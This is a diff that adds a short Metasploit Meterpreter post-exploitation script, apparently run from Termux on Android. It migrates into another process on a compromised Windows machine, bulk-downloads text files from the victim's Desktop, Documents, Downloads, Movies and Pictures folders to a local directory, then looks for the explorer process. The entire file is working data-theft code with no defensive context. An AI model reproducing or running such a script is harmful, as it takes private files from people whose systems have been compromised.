@@ -1,0 +1,11 @@
+run post/windows/manage/migrate
+cd ..
+cd ..
+cd ..
+cd ..
+download -f Desktop/*.txt? -r /data/data/com.termux/files/home/msf/download/
+download -f Documents/*.txt? -r /data/data/com.termux/files/home/msf/download/
+download -f Downloads/*txt? -r /data/data/com.termux/files/home/msf/download/
+download -f Movies/*.txt? -r /data/data/com.termux/files/home/msf/download/
+download -f Pictures/*.txt? -r /data/data/com.termux/files/home/msf/download/
+ps |grep explorer
